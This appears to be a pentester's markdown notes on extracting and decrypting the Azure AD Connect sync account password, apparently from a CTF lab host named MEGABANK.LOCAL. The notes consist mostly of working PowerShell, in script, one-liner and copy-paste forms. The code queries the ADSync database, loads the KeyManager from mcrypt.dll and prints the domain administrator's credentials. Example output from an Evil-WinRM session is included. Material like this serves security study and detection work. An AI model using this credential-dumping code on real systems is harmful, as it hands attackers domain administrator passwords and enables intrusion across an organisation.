
functionality
from https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/blob/main/decrypt.ps1
and https://github.com/VbScrub/AdSyncDecrypt/blob/master/MainModule.vb

script version
```powershell
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True"
$client.Open()
```

other possible connect stings
    `"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True"`
    `"Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True"`
    `"Data Source=127.0.0.1;Initial Catalog=ADSync;Integrated Security=True"`
    `"Data Source=localhost\SQLEXPRESS;Initial Catalog=ADSync;Integrated Security=True"`

command version of ^ integrated in the Invoke-Sqlcmd command


script version
```powershell
# Query for cryptographic keyset information from the mms_server_configuration table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)

$reader.Close()
```

command version
```powershell
$query1 = Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -Database ADSync -ServerInstance localhost
```


script version
```powershell
# Query for encrypted configuration and credentials from the mms_management_agent table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()

$config = $reader.GetString(0)
$crypted = $reader.GetString(1)

$reader.Close()
```

command version
```powershell
$query2 = Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -Database ADSync -ServerInstance localhost
```


load the Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
script & command version
```powershell
Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
```

other possible paths
    `"C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"`
    `"C:\Program Files (x86)\Microsoft Azure AD Sync\Bin\mcrypt.dll"`
    `"C:\Program Files\Microsoft Azure AD Connect\Bin\mcrypt.dll"`


script version
```powershell
$km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($query1.entropy,$query1.instance_id,$query1.keyset_id);

$key1 = $null
$km.GetActiveCredentialKey([ref]$key1)

$key2 = $null
$km.GetKey(1, [ref]$key2)

$decrypted = $null
$key2.DecryptBase64ToString($query2.encrypted_configuration,[ref]$decrypted);
```

command version
```powershell
($km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager).LoadKeySet($query1.entropy,$query1.instance_id,$query1.keyset_id);
$key1 = $null;$km.GetActiveCredentialKey([ref]$key1)
$key2 = $null;$km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($query2.encrypted_configuration,[ref]$decrypted);$decrypted
```


script version
```powershell
$domain = select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

command version
```powershell
(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}).Domain
(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}).Username
(select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}).Password
```


### Finished simple command version

```powershell
$query1 = Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -Database ADSync -ServerInstance localhost

$query2 = Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -Database ADSync -ServerInstance localhost

Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"

$km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($query1.entropy,$query1.instance_id,$query1.keyset_id);
$key1 = $null; $km.GetActiveCredentialKey([ref]$key1)
$key2 = $null; $km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($query2.encrypted_configuration,[ref]$decrypted)

(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}).Domain
(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}).Username
(select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}).Password
```

key1 is never used but the command is still run, just to make sure the keyvalues are loaded before running .GetKey
the number in GetKey is the index - 1 is usually the one in use

### Easy-to-copy version to run it as a script

the same with @''@ around it and >filename at the end
```powershell
@'
$query1 = Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -Database ADSync -ServerInstance localhost

$query2 = Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -Database ADSync -ServerInstance localhost

Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"

$km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($query1.entropy,$query1.instance_id,$query1.keyset_id);

$key2 = $null; $km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($query2.encrypted_configuration,[ref]$decrypted)

(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}).Domain
(select-xml -Content $query2.private_configuration_xml -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}).Username
(select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}).Password
'@>script.ps1
```

### Example output

##### Search 1

`Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -Database ADSync -ServerInstance localhost | fl`

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -Database ADSync -ServerInstance localhost|fl


keyset_id   : 1
instance_id : 1852b527-dd4f-4ecf-b541-efccbff29e31
entropy     : 194ec2fc-f186-46cf-b44d-071eb61f49cd
```

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)

##### Search 2

`Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -Database ADSync -ServerInstance localhost | fl`

```powershell
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -Database ADSync -ServerInstance localhost | fl


private_configuration_xml : <adma-configuration>
                             <forest-name>MEGABANK.LOCAL</forest-name>
                             <forest-port>0</forest-port>
                             <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
                             <forest-login-user>administrator</forest-login-user>
                             <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
                             <sign-and-seal>1</sign-and-seal>
                             <ssl-bind crl-check="0">0</ssl-bind>
                             <simple-bind>0</simple-bind>
                             <default-ssl-strength>0</default-ssl-strength>
                             <parameter-values>
                              <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
                              <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
                              <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
                              <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
                              <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
                              <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
                              <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
                              <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
                              <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
                              <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
                              <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
                              <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
                              <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
                              <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
                              <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
                              <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
                              <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
                              <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
                            </parameter-values>
                             <password-hash-sync-config>
                                        <enabled>1</enabled>
                                        <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
                                     </password-hash-sync-config>
                            </adma-configuration>
encrypted_configuration   : 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9z
                            Fr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
```

$config = $reader.GetString(0) - private_configuration_xml
$crypted = $reader.GetString(1) - encrypted_configuration

